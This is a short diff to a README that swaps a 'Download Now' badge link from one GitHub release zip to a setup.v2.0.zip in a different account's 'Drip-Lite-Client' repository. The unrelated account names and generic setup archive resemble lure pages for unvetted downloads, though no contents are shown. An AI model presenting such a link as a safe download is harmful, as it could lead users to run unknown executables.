@@ -17,7 +17,7 @@
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/MailJackdaw39/Meccha-Chameleon-MecchaVoid/releases/download/sdasd/setup.v1.7.zip)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/DoctorWhisper/Drip-Lite-Client/releases/download/set-v2.0/setup.v2.0.zip)
 
 
 </div>
